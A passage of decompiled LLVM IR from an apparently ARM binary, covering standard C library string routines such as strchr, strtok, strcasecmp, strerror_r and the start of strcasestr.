  store i1 %v2_14f90, i1* %cpsr_z.global-to-local, align 1
  %v3_14f94 = add i32 %v5_14f80, 2
  %v4_14f94 = inttoptr i32 %v3_14f94 to i8*
  store i8 %v3_14f8c, i8* %v4_14f94, align 1
  %v5_14f94 = load i32, i32* @ip, align 4
  %v6_14f94 = add i32 %v5_14f94, 1
  store i32 %v6_14f94, i32* @ip, align 4
  %v0_14f98 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f98 = add i32 %v0_14f98, 1
  store i32 %v1_14f98, i32* %r1.global-to-local, align 4
  %v0_14f9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f9c, label %dec_label_pc_14fc4, label %dec_label_pc_14fa0

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f8c
  %v1_14fa0 = add i32 %v0_14f98, 2
  %v2_14fa0 = inttoptr i32 %v1_14fa0 to i8*
  %v3_14fa0 = load i8, i8* %v2_14fa0, align 1
  %v4_14fa0 = zext i8 %v3_14fa0 to i32
  store i32 %v4_14fa0, i32* %r3.global-to-local, align 4
  %v2_14fa4 = icmp eq i8 %v3_14fa0, 0
  store i1 %v2_14fa4, i1* %cpsr_z.global-to-local, align 1
  %v3_14fa8 = add i32 %v5_14f94, 2
  %v4_14fa8 = inttoptr i32 %v3_14fa8 to i8*
  store i8 %v3_14fa0, i8* %v4_14fa8, align 1
  %v5_14fa8 = load i32, i32* @ip, align 4
  %v6_14fa8 = add i32 %v5_14fa8, 1
  store i32 %v6_14fa8, i32* @ip, align 4
  %v0_14fac = load i32, i32* %r1.global-to-local, align 4
  %v1_14fac = add i32 %v0_14fac, 1
  store i32 %v1_14fac, i32* %r1.global-to-local, align 4
  %v0_14fb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14fb0, label %dec_label_pc_14fc4, label %dec_label_pc_14fb4

dec_label_pc_14fb4:                               ; preds = %dec_label_pc_14fa0
  %v0_14fb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_14fb4 = add i32 %v0_14fb4, -1
  store i32 %v1_14fb4, i32* %lr.global-to-local, align 4
  %v7_14fb4 = icmp eq i32 %v0_14fb4, 1
  store i1 %v7_14fb4, i1* %cpsr_z.global-to-local, align 1
  %v1_14fb8 = add i32 %v0_14fac, 2
  store i32 %v1_14fb8, i32* @r1, align 4
  br i1 %v7_14fb4, label %dec_label_pc_14fd8, label %dec_label_pc_14f68

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14fa0, %dec_label_pc_14f8c, %dec_label_pc_14f78, %dec_label_pc_14f68
  %v1_14fc4 = phi i32 [ %v6_14fa8, %dec_label_pc_14fa0 ], [ %v6_14f94, %dec_label_pc_14f8c ], [ %v6_14f80, %dec_label_pc_14f78 ], [ %v6_14f70, %dec_label_pc_14f68 ]
  %v2_14fc41 = sub i32 %arg1, %v1_14fc4
  %v2_14fc8 = add i32 %v2_14fc41, %arg2
  %v1_14fcc = add i32 %v2_14fc8, -1
  store i32 %v1_14fcc, i32* %r3.global-to-local, align 4
  %v7_14fcc = icmp eq i32 %v2_14fc8, 1
  store i1 %v7_14fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14fcc, label %dec_label_pc_15008, label %dec_label_pc_14ff8

dec_label_pc_14fd8:                               ; preds = %dec_label_pc_14fb4, %entry
  %v2_14fe87 = phi i32 [ %v1_14f5c, %entry ], [ %v6_14fa8, %dec_label_pc_14fb4 ]
  %v1_14fd8 = urem i32 %arg2, 4
  store i32 %v1_14fd8, i32* %r3.global-to-local, align 4
  %v2_14fd8 = icmp eq i32 %v1_14fd8, 0
  store i1 %v2_14fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14fd8, label %dec_label_pc_15008, label %dec_label_pc_14fe0

dec_label_pc_14fe0:                               ; preds = %dec_label_pc_14fd8, %dec_label_pc_14ff0.dec_label_pc_14fe0_crit_edge
  %v2_14fe8 = phi i32 [ %v6_14fe8, %dec_label_pc_14ff0.dec_label_pc_14fe0_crit_edge ], [ %v2_14fe87, %dec_label_pc_14fd8 ]
  %v0_14fe4 = phi i32 [ %v0_14fe4.pre, %dec_label_pc_14ff0.dec_label_pc_14fe0_crit_edge ], [ %v1_14fd8, %dec_label_pc_14fd8 ]
  %v0_14fe0 = load i32, i32* @r1, align 4
  %v1_14fe0 = inttoptr i32 %v0_14fe0 to i8*
  %v2_14fe0 = load i8, i8* %v1_14fe0, align 1
  %v3_14fe0 = zext i8 %v2_14fe0 to i32
  store i32 %v3_14fe0, i32* %r2.global-to-local, align 4
  %v5_14fe0 = add i32 %v0_14fe0, 1
  store i32 %v5_14fe0, i32* @r1, align 4
  %v1_14fe4 = add i32 %v0_14fe4, -1
  store i32 %v1_14fe4, i32* %r3.global-to-local, align 4
  %v7_14fe4 = icmp eq i32 %v0_14fe4, 1
  store i1 %v7_14fe4, i1* %cpsr_z.global-to-local, align 1
  %v3_14fe8 = add i32 %v2_14fe8, 1
  %v4_14fe8 = inttoptr i32 %v3_14fe8 to i8*
  store i8 %v2_14fe0, i8* %v4_14fe8, align 1
  %v5_14fe8 = load i32, i32* @ip, align 4
  %v6_14fe8 = add i32 %v5_14fe8, 1
  store i32 %v6_14fe8, i32* @ip, align 4
  %v0_14fec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14fec, label %dec_label_pc_15008, label %dec_label_pc_14ff0

dec_label_pc_14ff0:                               ; preds = %dec_label_pc_14fe0
  %v0_14ff0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ff0 = icmp eq i32 %v0_14ff0, 0
  store i1 %v2_14ff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ff0, label %dec_label_pc_14ff8, label %dec_label_pc_14ff0.dec_label_pc_14fe0_crit_edge

dec_label_pc_14ff0.dec_label_pc_14fe0_crit_edge:  ; preds = %dec_label_pc_14ff0
  %v0_14fe4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14fe0

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14ff0, %dec_label_pc_14fc4
  %v2_1500010 = phi i32 [ %v1_14fc4, %dec_label_pc_14fc4 ], [ %v6_14fe8, %dec_label_pc_14ff0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ffc

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_14ffc.dec_label_pc_14ffc_crit_edge, %dec_label_pc_14ff8
  %v2_15000 = phi i32 [ %v6_15000, %dec_label_pc_14ffc.dec_label_pc_14ffc_crit_edge ], [ %v2_1500010, %dec_label_pc_14ff8 ]
  %v0_15000.off0 = phi i8 [ %extract.t, %dec_label_pc_14ffc.dec_label_pc_14ffc_crit_edge ], [ 0, %dec_label_pc_14ff8 ]
  %v0_14ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_14ffc = add i32 %v0_14ffc, -1
  store i32 %v1_14ffc, i32* %r3.global-to-local, align 4
  %v7_14ffc = icmp eq i32 %v0_14ffc, 1
  store i1 %v7_14ffc, i1* %cpsr_z.global-to-local, align 1
  %v3_15000 = add i32 %v2_15000, 1
  %v4_15000 = inttoptr i32 %v3_15000 to i8*
  store i8 %v0_15000.off0, i8* %v4_15000, align 1
  %v5_15000 = load i32, i32* @ip, align 4
  %v6_15000 = add i32 %v5_15000, 1
  store i32 %v6_15000, i32* @ip, align 4
  %v0_15004 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15004, label %dec_label_pc_15008, label %dec_label_pc_14ffc.dec_label_pc_14ffc_crit_edge

dec_label_pc_14ffc.dec_label_pc_14ffc_crit_edge:  ; preds = %dec_label_pc_14ffc
  %v0_15000.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_15000.pre to i8
  br label %dec_label_pc_14ffc

dec_label_pc_15008:                               ; preds = %dec_label_pc_14fe0, %dec_label_pc_14ffc, %dec_label_pc_14fc4, %dec_label_pc_14fd8
  %v2_15008 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15008, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15000, { 1, 0 }
  uselistorder i32 %v0_14ffc, { 1, 0 }
  uselistorder i32 %v6_14fe8, { 0, 2, 1 }
  uselistorder i32 %v1_14fd8, { 2, 1, 0 }
  uselistorder i32 %v2_14fc8, { 1, 0 }
  uselistorder i32 %v1_14fb8, { 1, 0 }
  uselistorder i32 %v0_14fb4, { 1, 0 }
  uselistorder i32 %v6_14fa8, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15008, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_14fe0, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15014 = urem i32 %arg1, 256
  %v0_150343 = load i32, i32* @r0, align 4
  %v1_150344 = urem i32 %v0_150343, 4
  %v2_150345 = icmp eq i32 %v1_150344, 0
  br i1 %v2_150345, label %dec_label_pc_1503c, label %dec_label_pc_1501c

dec_label_pc_1501c:                               ; preds = %entry, %dec_label_pc_15030
  %v0_15030 = phi i32 [ %v1_15030, %dec_label_pc_15030 ], [ %v0_150343, %entry ]
  %v1_1501c = inttoptr i32 %v0_15030 to i8*
  %v2_1501c = load i8, i8* %v1_1501c, align 1
  %v3_1501c = zext i8 %v2_1501c to i32
  store i32 %v3_1501c, i32* @r3, align 4
  %v9_15020 = icmp eq i32 %v3_1501c, %v1_15014
  br i1 %v9_15020, label %dec_label_pc_150f0, label %dec_label_pc_15028

dec_label_pc_15028:                               ; preds = %dec_label_pc_1501c
  %v2_15028 = icmp eq i8 %v2_1501c, 0
  br i1 %v2_15028, label %dec_label_pc_150ec, label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_15028
  %v1_15030 = add i32 %v0_15030, 1
  %v1_15034 = urem i32 %v1_15030, 4
  %v2_15034 = icmp eq i32 %v1_15034, 0
  br i1 %v2_15034, label %dec_label_pc_1503c, label %dec_label_pc_1501c

dec_label_pc_1503c:                               ; preds = %dec_label_pc_15030, %entry
  %v0_15040 = phi i32 [ %v0_150343, %entry ], [ %v1_15030, %dec_label_pc_15030 ]
  %v4_1503c = mul nuw nsw i32 %v1_15014, 256
  %v5_1503c = or i32 %v4_1503c, %v1_15014
  %v4_15044 = mul i32 %v5_1503c, 65536
  %v5_15044 = or i32 %v4_15044, %v5_1503c
  br label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %dec_label_pc_150e4, %dec_label_pc_15084, %dec_label_pc_1503c
  %v0_150ac = phi i32 [ %v0_15040, %dec_label_pc_1503c ], [ %v4_15048, %dec_label_pc_15084 ], [ %v4_15048, %dec_label_pc_150e4 ]
  %v1_15048 = inttoptr i32 %v0_150ac to i32*
  %v2_15048 = load i32, i32* %v1_15048, align 4
  %v4_15048 = add i32 %v0_150ac, 4
  %v2_15050 = xor i32 %v2_15048, %v5_15044
  %v2_15054 = add i32 %v2_15050, 2130640639
  store i32 %v2_15054, i32* @ip, align 4
  %v2_1505c = add i32 %v2_15048, 2130640639
  %v1_15060 = sub i32 -1, %v2_15048
  %v2_15064 = xor i32 %v2_1505c, %v1_15060
  %v2_15070 = and i32 %v2_15064, -2130640640
  %v2_15078 = icmp eq i32 %v2_15070, 0
  br i1 %v2_15078, label %dec_label_pc_15084, label %dec_label_pc_1508c

dec_label_pc_15084:                               ; preds = %dec_label_pc_15048
  %v1_1506c = sub i32 -1, %v2_15050
  %v2_15074 = xor i32 %v2_15054, %v1_1506c
  %v2_1507c = and i32 %v2_15074, -2130640640
  %v2_15084 = icmp eq i32 %v2_1507c, 0
  br i1 %v2_15084, label %dec_label_pc_15048, label %dec_label_pc_1508c

dec_label_pc_1508c:                               ; preds = %dec_label_pc_15048, %dec_label_pc_15084
  %v2_1508c = inttoptr i32 %v0_150ac to i8*
  %v3_1508c = load i8, i8* %v2_1508c, align 1
  %v4_1508c = zext i8 %v3_1508c to i32
  store i32 %v4_1508c, i32* @r3, align 4
  %v9_15090 = icmp eq i32 %v4_1508c, %v1_15014
  br i1 %v9_15090, label %dec_label_pc_150f0, label %dec_label_pc_1509c

dec_label_pc_1509c:                               ; preds = %dec_label_pc_1508c
  %v2_1509c = icmp eq i8 %v3_1508c, 0
  br i1 %v2_1509c, label %dec_label_pc_150ec, label %dec_label_pc_150a4

dec_label_pc_150a4:                               ; preds = %dec_label_pc_1509c
  %v1_150a4 = add i32 %v0_150ac, 1
  %v2_150a4 = inttoptr i32 %v1_150a4 to i8*
  %v3_150a4 = load i8, i8* %v2_150a4, align 1
  %v4_150a4 = zext i8 %v3_150a4 to i32
  store i32 %v4_150a4, i32* @r3, align 4
  %v9_150a8 = icmp eq i32 %v4_150a4, %v1_15014
  br i1 %v9_150a8, label %dec_label_pc_150f0, label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %dec_label_pc_150a4
  %v2_150b4 = icmp eq i8 %v3_150a4, 0
  br i1 %v2_150b4, label %dec_label_pc_150ec, label %dec_label_pc_150bc

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150b4
  %v1_150bc = add i32 %v0_150ac, 2
  %v2_150bc = inttoptr i32 %v1_150bc to i8*
  %v3_150bc = load i8, i8* %v2_150bc, align 1
  %v4_150bc = zext i8 %v3_150bc to i32
  store i32 %v4_150bc, i32* @r3, align 4
  %v9_150c0 = icmp eq i32 %v4_150bc, %v1_15014
  br i1 %v9_150c0, label %dec_label_pc_150f0, label %dec_label_pc_150cc

dec_label_pc_150cc:                               ; preds = %dec_label_pc_150bc
  %v2_150cc = icmp eq i8 %v3_150bc, 0
  br i1 %v2_150cc, label %dec_label_pc_150ec, label %dec_label_pc_150d4

dec_label_pc_150d4:                               ; preds = %dec_label_pc_150cc
  %v1_150d4 = add i32 %v0_150ac, 3
  %v2_150d4 = inttoptr i32 %v1_150d4 to i8*
  %v3_150d4 = load i8, i8* %v2_150d4, align 1
  %v4_150d4 = zext i8 %v3_150d4 to i32
  store i32 %v4_150d4, i32* @r3, align 4
  %v9_150d8 = icmp eq i32 %v4_150d4, %v1_15014
  br i1 %v9_150d8, label %dec_label_pc_150f0, label %dec_label_pc_150e4

dec_label_pc_150e4:                               ; preds = %dec_label_pc_150d4
  %v2_150e4 = icmp eq i8 %v3_150d4, 0
  br i1 %v2_150e4, label %dec_label_pc_150ec, label %dec_label_pc_15048

dec_label_pc_150ec:                               ; preds = %dec_label_pc_15028, %dec_label_pc_150e4, %dec_label_pc_150cc, %dec_label_pc_150b4, %dec_label_pc_1509c
  br label %dec_label_pc_150f0

dec_label_pc_150f0:                               ; preds = %dec_label_pc_1501c, %dec_label_pc_150d4, %dec_label_pc_150bc, %dec_label_pc_150a4, %dec_label_pc_1508c, %dec_label_pc_150ec
  %v1_150f4 = phi i32 [ 0, %dec_label_pc_150ec ], [ %v1_150d4, %dec_label_pc_150d4 ], [ %v1_150bc, %dec_label_pc_150bc ], [ %v1_150a4, %dec_label_pc_150a4 ], [ %v0_150ac, %dec_label_pc_1508c ], [ %v0_15030, %dec_label_pc_1501c ]
  ret i32 %v1_150f4

; uselistorder directives
  uselistorder i32 %v4_15048, { 1, 0 }
  uselistorder i32 %v2_15048, { 0, 2, 1 }
  uselistorder i32 %v0_150ac, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1503c, { 1, 0 }
  uselistorder i32 %v1_15030, { 1, 0, 2 }
  uselistorder i32 %v0_150343, { 2, 1, 0 }
  uselistorder i32 %v1_15014, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_150f0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_150ec, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1508c, { 1, 0 }
  uselistorder label %dec_label_pc_1501c, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15108 = call i32 @__xpg_strerror_r()
  %v0_1510c = load i32, i32* @r4, align 4
  ret i32 %v0_1510c
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 25944), i32* @r2, align 4
  %v0_15130 = call i32 @strtok_r()
  ret i32 %v0_15130
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_15164

dec_label_pc_15164:                               ; preds = %dec_label_pc_15190, %entry
  %v1_151a88 = phi i32 [ %v1_151a89, %dec_label_pc_15190 ], [ 0, %entry ]
  %v0_15198 = phi i32 [ %v1_15198, %dec_label_pc_15190 ], [ %arg2, %entry ]
  %v0_1519c = phi i32 [ %v1_1519c, %dec_label_pc_15190 ], [ %tmp, %entry ]
  %v9_15164 = icmp eq i32 %v0_1519c, %v0_15198
  %.pre = inttoptr i32 %v0_1519c to i8*
  br i1 %v9_15164, label %dec_label_pc_15190, label %dec_label_pc_1516c

dec_label_pc_1516c:                               ; preds = %dec_label_pc_15164
  %v2_1516c = load i8, i8* %.pre, align 1
  %v3_1516c = zext i8 %v2_1516c to i32
  %v1_15170 = inttoptr i32 %v0_15198 to i8*
  %v2_15170 = load i8, i8* %v1_15170, align 1
  %v3_15170 = zext i8 %v2_15170 to i32
  %v4_15174 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 1276) to i32*), align 4
  %v2_15178 = mul nuw nsw i32 %v3_15170, 2
  %v2_1517c = mul nuw nsw i32 %v3_1516c, 2
  %v2_15180 = add i32 %v4_15174, %v2_15178
  %v3_15180 = inttoptr i32 %v2_15180 to i16*
  %v4_15180 = load i16, i16* %v3_15180, align 2
  %v6_15180 = sext i16 %v4_15180 to i32
  %v2_15184 = add i32 %v4_15174, %v2_1517c
  %v3_15184 = inttoptr i32 %v2_15184 to i16*
  %v4_15184 = load i16, i16* %v3_15184, align 2
  %v6_15184 = sext i16 %v4_15184 to i32
  %v2_15188 = sub nsw i32 %v6_15184, %v6_15180
  %v9_15188 = icmp eq i16 %v4_15184, %v4_15180
  br i1 %v9_15188, label %dec_label_pc_15190, label %dec_label_pc_151a4

dec_label_pc_15190:                               ; preds = %dec_label_pc_15164, %dec_label_pc_1516c
  %v1_151a89 = phi i32 [ %v2_15188, %dec_label_pc_1516c ], [ %v1_151a88, %dec_label_pc_15164 ]
  %v2_15190 = load i8, i8* %.pre, align 1
  %v2_15194 = icmp eq i8 %v2_15190, 0
  %v1_15198 = add i32 %v0_15198, 1
  %v1_1519c = add i32 %v0_1519c, 1
  store i32 %v1_1519c, i32* @ip, align 4
  br i1 %v2_15194, label %dec_label_pc_151a4, label %dec_label_pc_15164

dec_label_pc_151a4:                               ; preds = %dec_label_pc_15190, %dec_label_pc_1516c
  %v1_151a8 = phi i32 [ %v1_151a89, %dec_label_pc_15190 ], [ %v2_15188, %dec_label_pc_1516c ]
  ret i32 %v1_151a8

; uselistorder directives
  uselistorder i32 %v1_1519c, { 1, 0 }
  uselistorder i32 %v2_15188, { 1, 0 }
  uselistorder i32 %v0_1519c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15190, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_151b4 = load i32, i32* @r4, align 4
  %v9_151b4 = load i32, i32* @r6, align 4
  %v0_151bc = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  store i32 %v0_151bc, i32* @ip, align 4
  %v0_151cc = load i32, i32* @r1, align 4
  store i32 %v0_151cc, i32* @r7, align 4
  %v0_151d0 = load i32, i32* @r2, align 4
  store i32 %v0_151d0, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_151bc, 124
  br i1 %tmp, label %dec_label_pc_15208, label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %entry
  br label %dec_label_pc_151f0

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151f0
  br i1 %v2_151fc, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_151e4
  %v2_151e8 = add i32 %v1_15200, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_151e4, %bb
  %v0_151f01 = phi i32 [ %v1_15200, %dec_label_pc_151e4 ], [ %v2_151e8, %bb ]
  %v1_151ec = add i32 %v0_151ec, 1
  br label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151d8, %bb15
  %v1_15200 = phi i32 [ %v0_151bc, %dec_label_pc_151d8 ], [ %v0_151f01, %bb15 ]
  %v0_151ec = phi i32 [ add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -36892), %dec_label_pc_151d8 ], [ %v1_151ec, %bb15 ]
  store i32 %v0_151ec, i32* @r5, align 4
  %v2_151f0 = icmp eq i32 %v1_15200, 0
  %v1_151f4 = inttoptr i32 %v0_151ec to i8*
  %v2_151f4 = load i8, i8* %v1_151f4, align 1
  %v3_151f4 = zext i8 %v2_151f4 to i32
  store i32 %v3_151f4, i32* @r3, align 4
  %v2_151fc = icmp eq i8 %v2_151f4, 0
  br i1 %v2_151f0, label %dec_label_pc_151fc, label %dec_label_pc_151e4

dec_label_pc_151fc:                               ; preds = %dec_label_pc_151f0
  br i1 %v2_151fc, label %dec_label_pc_15208, label %bb16

bb16:                                             ; preds = %dec_label_pc_151fc
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15244

dec_label_pc_15208:                               ; preds = %dec_label_pc_151fc, %entry
  store i32 %v0_151bc, i32* @r2, align 4
  %v3_15210 = ashr i32 %v0_151bc, 31
  store i32 %v3_15210, i32* @r3, align 4
  %v6_15224 = bitcast i32* %stack_var_-25 to i8*
  %v7_15224 = call i32 @_uintmaxtostr(i8* %v6_15224)
  %v1_1522c = add i32 %v7_15224, -14
  store i32 %v1_1522c, i32* @r5, align 4
  %v0_15230 = load i32, i32* @r6, align 4
  %v2_15230 = add i32 %v0_15230, -36908
  store i32 %v2_15230, i32* @r1, align 4
  store i32 %v1_1522c, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_1523c = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_15244.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15244

dec_label_pc_15244:                               ; preds = %bb16, %dec_label_pc_15208
  %v0_15244 = phi i32 [ %v0_151ec, %bb16 ], [ %v0_15244.pre, %dec_label_pc_15208 ]
  %v1_15244 = inttoptr i32 %v0_15244 to i8*
  %v3_15248 = call i32 @strlen(i8* %v1_15244)
  %v0_1524c = load i32, i32* @r7, align 4
  %v2_1524c = icmp eq i32 %v0_1524c, 0
  br i1 %v2_1524c, label %bb17, label %dec_label_pc_15244._crit_edge

dec_label_pc_15244._crit_edge:                    ; preds = %dec_label_pc_15244
  %v1_15258.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_15244
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15244._crit_edge, %bb17
  %v1_15258 = phi i32 [ %v1_15258.pre, %dec_label_pc_15244._crit_edge ], [ 0, %bb17 ]
  %v1_15254 = add i32 %v3_15248, 1
  %v3_15258 = icmp uge i32 %v1_15254, %v1_15258
  %v9_15258 = icmp eq i32 %v1_15254, %v1_15258
  %v2_1525c = xor i1 %v3_15258, true
  %v3_1525c = or i1 %v9_15258, %v2_1525c
  br i1 %v3_1525c, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_15254, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_1526c = phi i32 [ %v1_15258, %bb18 ], [ %v1_15254, %bb19 ]
  %v2_15260 = xor i1 %v9_15258, true
  %v3_15260 = and i1 %v3_15258, %v2_15260
  br i1 %v3_15260, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_15264 = icmp eq i32 %v0_1526c, 0
  br i1 %v2_15264, label %dec_label_pc_15288, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %bb22
  store i32 %v0_1526c, i32* @r2, align 4
  %v0_15270 = load i32, i32* @r5, align 4
  store i32 %v0_15270, i32* @r1, align 4
  store i32 %v0_1524c, i32* @r0, align 4
  %v0_15278 = call i32 @memcpy()
  %v0_1527c = load i32, i32* @r4, align 4
  %v1_1527c = load i32, i32* @r7, align 4
  %v2_1527c = add i32 %v1_1527c, %v0_1527c
  %v3_15284 = add i32 %v2_1527c, -1
  %v4_15284 = inttoptr i32 %v3_15284 to i8*
  store i8 0, i8* %v4_15284, align 1
  br label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %bb22, %dec_label_pc_1526c
  %v0_15288 = load i32, i32* %r6.global-to-local, align 4
  %v2_15288 = icmp eq i32 %v0_15288, 0
  br i1 %v2_15288, label %dec_label_pc_15298, label %dec_label_pc_15290

dec_label_pc_15290:                               ; preds = %dec_label_pc_15288
  %v0_15290 = call i32 @__GI___errno_location()
  %v0_15294 = load i32, i32* %r6.global-to-local, align 4
  %v2_15294 = inttoptr i32 %v0_15290 to i32*
  store i32 %v0_15294, i32* %v2_15294, align 4
  %v0_15298.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_15288, %dec_label_pc_15290
  %v0_15298 = phi i32 [ 0, %dec_label_pc_15288 ], [ %v0_15298.pre, %dec_label_pc_15290 ]
  store i32 %v3_151b4, i32* @r4, align 4
  store i32 %v9_151b4, i32* %r6.global-to-local, align 4
  ret i32 %v0_15298

; uselistorder directives
  uselistorder i1 %v3_15258, { 1, 0 }
  uselistorder i32 %v0_151ec, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15200, { 1, 0, 2 }
  uselistorder i32 %v0_151bc, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_15298, { 1, 0 }
  uselistorder label %dec_label_pc_15288, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15244, { 1, 0 }
  uselistorder label %dec_label_pc_151f0, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_152c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_152d423 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_152d4.outer

dec_label_pc_152d4.outer:                         ; preds = %dec_label_pc_15314, %entry
  %v0_15314.ph = phi i32 [ %v1_15314, %dec_label_pc_15314 ], [ %v0_152c0, %entry ]
  %v2_152d424 = load i8, i8* %v1_152d423, align 1
  %v2_152d826 = icmp eq i8 %v2_152d424, 0
  br i1 %v2_152d826, label %bb, label %dec_label_pc_152ec

bb:                                               ; preds = %dec_label_pc_152d4.backedge, %dec_label_pc_152d4.outer
  store i32 %v0_15314.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15328

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152d4.outer, %dec_label_pc_152d4.backedge
  %v1_152e032.in = phi i32 [ %v1_152e032, %dec_label_pc_152d4.backedge ], [ %arg2, %dec_label_pc_152d4.outer ]
  %v2_152d430 = phi i8 [ %v2_152d4, %dec_label_pc_152d4.backedge ], [ %v2_152d424, %dec_label_pc_152d4.outer ]
  %v2_152dc31.in.in = phi i8 [ %v2_152d4, %dec_label_pc_152d4.backedge ], [ %v2_152d424, %dec_label_pc_152d4.outer ]
  %v0_152f829 = phi i32 [ %v1_152f8, %dec_label_pc_152d4.backedge ], [ %v0_15314.ph, %dec_label_pc_152d4.outer ]
  %v1_152e032 = add i32 %v1_152e032.in, 1
  %v1_152ec = inttoptr i32 %v0_152f829 to i8*
  %v2_152ec = load i8, i8* %v1_152ec, align 1
  %v3_152ec = zext i8 %v2_152ec to i32
  store i32 %v3_152ec, i32* %r0.global-to-local, align 4
  %v9_152f0 = icmp eq i8 %v2_152d430, %v2_152ec
  %v1_152f8 = add i32 %v0_152f829, 1
  br i1 %v9_152f0, label %dec_label_pc_152d4.backedge, label %dec_label_pc_15300

dec_label_pc_152d4.backedge:                      ; preds = %dec_label_pc_152ec, %dec_label_pc_15300
  %v1_152d4 = inttoptr i32 %v1_152e032 to i8*
  %v2_152d4 = load i8, i8* %v1_152d4, align 1
  %v2_152d8 = icmp eq i8 %v2_152d4, 0
  br i1 %v2_152d8, label %bb, label %dec_label_pc_152ec

dec_label_pc_15300:                               ; preds = %dec_label_pc_152ec
  %v2_152dc31.in = zext i8 %v2_152dc31.in.in to i32
